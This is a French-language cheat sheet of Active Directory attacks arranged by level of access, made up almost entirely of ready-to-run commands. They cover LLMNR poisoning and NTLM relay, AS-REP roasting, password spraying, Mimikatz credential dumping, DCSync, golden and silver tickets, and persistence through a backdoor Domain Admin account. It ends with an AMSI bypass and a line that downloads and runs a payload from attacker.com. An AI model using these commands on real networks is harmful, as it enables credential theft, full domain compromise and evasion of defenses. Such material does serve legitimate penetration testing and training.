# Stratégies d'attaque Active Directory selon le niveau d'accès
## Sans credentials
### Découverte réseau et énumération initiale
```bash
# Découverte d'hôtes actifs
fping -asgq 192.168.1.0/24
nmap -sn 192.168.1.0/24

# Identification des contrôleurs de domaine
nmap -p 389,636,3268,3269,88,53,445 --open 192.168.1.0/24
```
### Exploitation des services anonymes
#### LDAP anonyme
```bash
# Vérifier si l'accès anonyme est autorisé
ldapsearch -x -h 192.168.1.10 -p 389 -b "dc=domain,dc=local" -s sub "(objectclass=*)"

# Extraire des informations sur le domaine
ldapsearch -x -h 192.168.1.10 -p 389 -b "dc=domain,dc=local" -s base "objectclass=*"
```
#### SMB anonyme
```bash
# Énumération des partages accessibles
smbmap -H 192.168.1.10 -u '' -p ''
smbclient -N -L //192.168.1.10

# Accès aux partages sans authentification
smbclient -N //192.168.1.10/SYSVOL
```
### Empoisonnement LLMNR/NBT-NS
```bash
# Lancement de Responder
sudo responder -I eth0 -wfv

# Craquage des hashes capturés
hashcat -m 5600 hashes.txt wordlist.txt

# Configuration pour le relais NTLM (attaque plus avancée)
sudo ntlmrelayx.py -t smb://192.168.1.10 -smb2support

# Ou pour relayer vers LDAP/S afin d'obtenir plus de privilèges
sudo ntlmrelayx.py -t ldaps://192.168.1.10 --delegate-access
```
### Exploitation des services web
```bash
# Découverte des portails web
nmap -p 80,443,8080,8443 --open 192.168.1.0/24

# Fuzzing des sous-domaines
wfuzz -u http://domain.local -H "Host: FUZZ.domain.local" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
```
## Avec un accès initial (assumed breach)
### Énumération post-compromission
```powershell
# Informations sur l'utilisateur actuel
whoami /all

# Énumération du domaine avec PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainPolicy | select -ExpandProperty SystemAccess
```
### Recherche de privilèges et accès
```powershell
# Recherche d'accès administrateur local
Find-LocalAdminAccess

# Recherche de sessions utilisateurs
Find-DomainUserLocation | select UserName,SessionFromName

# Recherche de partages intéressants
Find-DomainShare -CheckShareAccess
```
### Collecte avec BloodHound
```powershell
# Exécution de SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Depuis Linux avec un compte compromis
bloodhound-python -u user -p 'password' -d domain.local -c All -ns 192.168.1.10
```
### Exploitation des ACLs
```powershell
# Recherche d'ACLs exploitables pour l'utilisateur actuel
$sid = Convert-NameToSid "username"
Get-DomainObjectACL -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```
## Avec un username mais pas de mot de passe
### AS-REP Roasting
```bash
# Identification des comptes sans pré-authentification Kerberos
GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -request -format hashcat -usersfile users.txt
# Ou pour tester tous les utilisateurs du domaine
GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -request -format hashcat -no-pass

# Craquage des hashes
hashcat -m 18200 hashes.txt wordlist.txt
```
### Password Spraying
```bash
# Avec Kerbrute (méthode discrète)
kerbrute passwordspray -d domain.local --dc 192.168.1.10 users.txt 'Spring2023!'

# Avec CrackMapExec
crackmapexec smb 192.168.1.10 -u users.txt -p 'Spring2023!' --continue-on-success
```
### Recherche de mots de passe dans des sources publiques
```bash
# Vérification des fuites de données
curl -s https://haveibeenpwned.com/api/v3/breachedaccount/user@domain.com

# Recherche sur GitHub et Pastebin
# Utiliser des outils comme trufflehog ou gitleaks
```
## Avec un mot de passe mais pas d'username
### Bruteforce d'utilisateurs
```bash
# Avec Kerbrute
kerbrute userenum -d domain.local --dc 192.168.1.10 userlist.txt

# Avec SMB
crackmapexec smb 192.168.1.10 -u userlist.txt -p 'KnownPassword' --continue-on-success
```
### Énumération RID
```bash
# Avec rpcclient
rpcclient -U "" -N 192.168.1.10
rpcclient $> enumdomusers

# Avec impacket
lookupsid.py 'anonymous:@192.168.1.10'
```
### Vérification des conventions de nommage
```bash
# Génération de listes d'utilisateurs basées sur des modèles
# Exemple: prénom.nom, p.nom, pnom, etc.
for name in $(cat names.txt); do
  echo "${name}" >> userlist.txt
  echo "${name:0:1}.${name}" >> userlist.txt
  echo "${name:0:1}${name}" >> userlist.txt
done
```
## Scénario post-exploitation
### Extraction de credentials
```powershell
# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump des hashes SAM
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save

#and to dump:
secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```
### Élévation de privilèges via DCSync
```powershell
# Vérification des droits DCSync
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') }

# Exécution de DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /user:krbtgt"'
secretsdump.py -just-dc domain.local/user:password@192.168.1.10
```
### Création de Golden/Silver Tickets
```powershell
# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.local /sid:S-1-5-21-X-Y-Z /rc4:HASH_OF_KRBTGT /user:FakeAdmin /id:500 /ptt"'

# Silver Ticket
Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.local /sid:S-1-5-21-X-Y-Z /rc4:HASH_OF_COMPUTER_ACCOUNT /user:FakeAdmin /service:cifs /target:server.domain.local /ptt"'
```
### Persistance
```powershell
# Ajout d'un utilisateur au groupe Domain Admins
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'backdooruser'

# Création d'un compte machine avec délégation
New-MachineAccount -MachineAccount "PERSISTENCE$" -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
Set-ADComputer -Identity "PERSISTENCE$" -TrustedForDelegation $true
```
### Évasion des détections
```powershell
# Contournement d'AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Exécution en mémoire
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Utilisation de canaux de communication alternatifs
# DNS, ICMP, etc.
```
